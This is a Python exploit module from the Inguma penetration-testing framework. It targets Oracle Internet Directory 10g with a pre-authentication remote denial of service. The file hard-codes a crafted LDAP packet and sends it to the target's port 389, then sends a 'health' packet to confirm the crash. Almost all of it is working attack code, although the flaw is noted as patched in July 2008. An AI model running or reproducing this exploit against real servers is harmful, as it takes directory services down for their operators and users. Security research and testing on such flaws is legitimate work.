##      COraOidDos.py
#
#       Copyright 2010 Joxean Koret <joxeankoret@yahoo.es>
#
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#
#       This program is distributed in the hope that it will be useful,
#       but WITHOUT ANY WARRANTY; without even the implied warranty of
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#       GNU General Public License for more details.
#
#       You should have received a copy of the GNU General Public License
#       along with this program; if not, write to the Free Software
#       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#       MA 02110-1301, USA.

"""
Oracle OID 10.1.4 Remote Denial Of Service for Inguma
"""

import sys
import time
import socket

from lib.module import CIngumaExploitModule

name = "oraoiddos"
brief_description = "Oracle OID 10.1.4 Remote DOS Preauth"
type = "exploit"
affects = ["Oracle Internet Directory 10g"]
description = """
Oracle Internet Directory 10g (any version) under Win32 is vulnerable to a
preauthentication remote denial of service condition.
"""
patch = "Fixed in CPUJul2008"
category = "dos"
discoverer = "Joxean Koret"
author = "Joxean Koret <joxeankoret@yahoo.es>"

healthPacket = "0%\\x02\\x01\\x01c \\x04\\x00\\n\\x01\\x02\\n\\x01\\x00\\x02\\x01\\x00\\x02\\x01\\x00\\x01\\x01\\x00\\x87\\x0bobjectClass0\\x00"
packet = "\x30\x0e\x02\x01\x01\x60\x09\x30\x01\x03\x04\x02\x44\x4e\x80\x00"

class COraOidDos(CIngumaExploitModule):
    port = 0
    waitTime = 0
    timeout = 1
    exploitType = 1
    services = {}
    results = {}
    dict = None
    interactive = False

    def checkHealth(self, hostname, port):
        self.gom.echo("  --> Wating 5 seconds")
        time.sleep(5)

        self.gom.echo("  --> Connecting to target...")
        socket.setdefaulttimeout(5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((hostname, port))

        try:
            self.gom.echo("  --> Sending 'health' packet ...")
            s.sendall(healthPacket)
            self.gom.echo("  --> Trying to receive something...")
            data = s.recv(1024)
        except:
            err = sys.exc_info()[1]

            if int(err[0]) == 104:
                self.gom.echo("[+] Exploits works!")
                return

        if data != "":
            self.gom.echo("[!] Server is up and running :(")
        else:
            self.gom.echo("[?] Server doesn't answer nothing. It works?")

    def oidDos(self, hostname, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.gom.echo("[+] Connecting to ldap://%s:%d..." % (hostname, port))
            s.connect((hostname, int(port)))

            self.gom.echo("[+] Sending packet...")
            s.sendall(packet)
            s.close()

            self.gom.echo("[+] Checking OID's health...")
            self.checkHealth(self, hostname, port)
        except:
            self.gom.echo(sys.exc_info()[1])

    def run(self):
        if self.target == "" or self.target is None:
            self.target = "localhost"

        if self.port == 0 or self.port is None:
            self.port = 389

        self.oidDos(self.target, self.port)

        return True
